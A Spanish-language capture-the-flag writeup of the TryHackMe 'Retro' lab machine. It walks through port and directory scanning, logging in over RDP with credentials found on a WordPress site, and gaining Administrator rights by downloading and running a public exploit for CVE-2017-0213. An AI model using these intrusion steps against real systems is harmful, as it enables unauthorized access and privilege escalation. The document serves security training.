---
title: Try Hack Me - Retro - Writeup
date: 2022-09-29 10:30:00 +0800
categories: ["Try Hack Me"]
tags: [thm, writeups]     # TAG names should always be lowercase
---

En esta guía vamos a resolver el room [Retro](https://tryhackme.com/room/retro), una sala de dificultad **Alta** disponible en [THM](https://tryhackme.com) y creada por [DarkStar7471](https://tryhackme.com/p/DarkStar7471).

Dentro música.

## Enumeración

En la descripción el autor nos informa que la máquina no responde a ping. Atentos a ello lanzamos un **nmap** básico con la flag `-Pn`.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Retro]
└─$ nmap -Pn 10.10.30.226
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 10:04 CEST
Nmap scan report for 10.10.30.226
Host is up (0.036s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
```

Tenemos dos puertos escuchando:

* *80/tcp*: con un servicio **http** detrás.
* *3389/tcp*: con un servicio **ms-wbt-server** detrás.

Vamos a ello.

## HTTP

Arrancamos con el **http** y escaneamos directorios con **gobuster**.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Retro]
└─$ gobuster dir -u http://10.10.30.226 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.30.226
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/29 10:10:42 Starting gobuster in directory enumeration mode
===============================================================
/<EDITADO>                (Status: 301) [Size: 149] [--> http://10.10.30.226/<EDITADO>/]
/<EDITADO>                (Status: 301) [Size: 149] [--> http://10.10.30.226/<EDITADO>/]
[...]
```

Con esto podemos responder al primer desafío.

Nos vamos al navegador y cargamos `http://10.10.30.226/<EDITADO>/`

![](/assets/posts/20220927/retro01.png)

Según parece tenemos un primer nombre de usuario: *Wade*.

Trasteamos con la web, nos leemos los posts, probamos a dejar una respuesta ... y damos con ésto:

![](/assets/posts/20220927/retro02.png)

Nuestro amigo *Wade* se ha dejado un recordatorio con info interesante.

Pero no acaba aquí la cosa. Dentro de los links del apartado **META** hay uno especialmente goloso. Le damos y se nos carga la siguiente página.

![](/assets/posts/20220927/retro03.png)

Probamos con las credenciales que hemos conseguido (*Wade:parzival*) y accedemos al dashboard de Wordpress.

![](/assets/posts/20220927/retro04.png)

Desde este punto podemos intentar cargar una shell reversa en PHP en alguna de las páginas del site para conectarnos contra nuestro equipo. En mi caso, decidí frenar aquí y ver qué da de sí el otro puerto abierto.

## RDP

Lanzamos un escaneo utilizando los oportunos scripts de **nmap**.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Retro]
└─$ nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 10.10.30.226
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 10:09 CEST
Nmap scan report for 10.10.30.226
Host is up (0.036s latency).
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2022-09-29T08:09:48+00:00
| rdp-enum-encryption:
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
Nmap done: 1 IP address (1 host up) scanned in 2.21 seconds
```

Bien, probamos a conectarnos via RDP con **xfreerdp** y las credenciales de que disponemos.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Retro]
└─$ xfreerdp /u:Wade /p:parzival /v:10.10.30.226 /w:800 /h:600
```

OK, estamos dentro, y en el escritorio nos aparece un fichero con la flag correspondiente al usuario.

A partir de este punto confieso que me tiré un buen rato trasteando y probando cosas, todas sin éxito :(

Finalmente encontré el modo de avanzar [aquí](https://steflan-security.com/tryhackme-retro-walkthrough/). Por lo visto, la versión del sistema operativo del servidor tiene una vulneravilidad conocida [CVE-2017-0213](https://nvd.nist.gov/vuln/detail/CVE-2017-0213) que podemos aprovechar utilizando el fichero `CVE-2017-0213_x64.zip` disponible [aquí](https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213/Binaries).

Lo descargamos a nuestro directorio de trabajo e iniciamos un servicio HTTP con python3 para poderlo traspasar a la máquina objetivo.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Retro]
└─$ wget https://github.com/WindowsExploits/Exploits/raw/master/CVE-2017-0213/Binaries/CVE-2017-0213_x64.zip
--2022-09-29 18:53:18--  https://github.com/WindowsExploits/Exploits/raw/master/CVE-2017-0213/Binaries/CVE-2017-0213_x64.zip
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/WindowsExploits/Exploits/master/CVE-2017-0213/Binaries/CVE-2017-0213_x64.zip [following]
--2022-09-29 18:53:18--  https://raw.githubusercontent.com/WindowsExploits/Exploits/master/CVE-2017-0213/Binaries/CVE-2017-0213_x64.zip
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 83287 (81K) [application/zip]
Saving to: 'CVE-2017-0213_x64.zip'

CVE-2017-0213_x64.zip                     100%[===================================================================================>]  81.33K  --.-KB/s    in 0.01s   

2022-09-29 18:53:18 (5.93 MB/s) - 'CVE-2017-0213_x64.zip' saved [83287/83287]


┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Retro]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

En el equipo remoto abrimos **Chrome** y descargamos el `.zip` atacando a nuestra máquina.

![](/assets/posts/20220927/retro05.png)

Nos vamos a la carpeta de Descargas, abrimos el zip y ejecutamos.

![](/assets/posts/20220927/retro06.png)

![](/assets/posts/20220927/retro07.png)

Se nos abre un cmd con privilegios de Administrador.

![](/assets/posts/20220927/retro08.png)

Confirmamos y nos movemos al Escritorio del Administrador.

![](/assets/posts/20220927/retro09.png)

Hemos conseguido la flag de root.

Espero os hayan resultado útiles éstas notas.

Sed curiosos.

